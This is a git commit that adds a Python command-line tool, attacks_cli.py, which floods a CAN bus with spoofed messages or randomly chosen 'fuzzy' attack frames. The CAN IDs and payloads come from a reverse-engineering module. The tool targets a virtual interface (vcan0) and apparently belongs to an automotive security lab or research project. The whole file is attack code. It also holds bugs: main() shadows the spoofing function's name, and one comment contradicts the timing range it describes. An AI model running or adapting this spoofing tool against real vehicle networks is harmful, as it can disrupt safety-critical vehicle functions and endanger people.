8a311201a8ae4ddf5365dee6f8a4c058891d9d68
Luigi Luz <luigiluz98@gmail.com>
2025-06-09 23:21:23 -0300

    Add attacks_cli

---
+++ attacks/attacks_cli.py
@@ -0,0 +1,62 @@
+import argparse
+import can
+import time
+import random
+
+from reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
+
+def fuzzy_attack(bus):
+    known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
+    n_of_attacks = len(known_attacks)
+
+    while True:
+        # Select a random time between 0.1 and 0.01 using another approach
+        sleep_time = random.uniform(0.5, 1.0)
+        # Select a random attack
+        attack = random.choice(known_attacks)
+        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
+        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
+        bus.send(msg)
+        print(f"Sent fuzzy attack message: {msg}")
+        time.sleep(sleep_time)
+
+def spoofing_attacks(bus, feature: str, period: float):
+    while True:
+        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
+        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
+        bus.send(msg)
+        print(f"Sent message: {msg}")
+        time.sleep(period)
+
+
+def main():
+    print("CAN network attacks CLI")
+    spoofing_attacks = FEATURE_CAN_ID_PAYLOAD_MAPPER.keys()
+    available_features = [*spoofing_attacks, "fuzzy"]
+
+    parser = argparse.ArgumentParser(description="Perform CAN network attacks.")
+    parser.add_argument("--feature", choices=available_features, help="Feature to attack")
+    parser.add_argument("--period", type=float, default=0.1, help="Period between messages in seconds")
+
+    args = parser.parse_args()
+    if not args.feature:
+        print("No feature specified. Use --feature to select a feature.")
+        return
+    if args.feature not in available_features:
+        print(f"Feature '{args.feature}' is not available. Choose from {available_features}.")
+    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
+
+    try:
+        if args.feature == "fuzzy":
+            print(f"Attacking feature: {args.feature}")
+            fuzzy_attack(bus)
+        else:
+            print(f"Attacking feature: {args.feature} with period {args.period} seconds")
+            spoofing_attacks(bus, args.feature, args.period)
+    except KeyboardInterrupt:
+        print("Attack stopped by user.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    main()
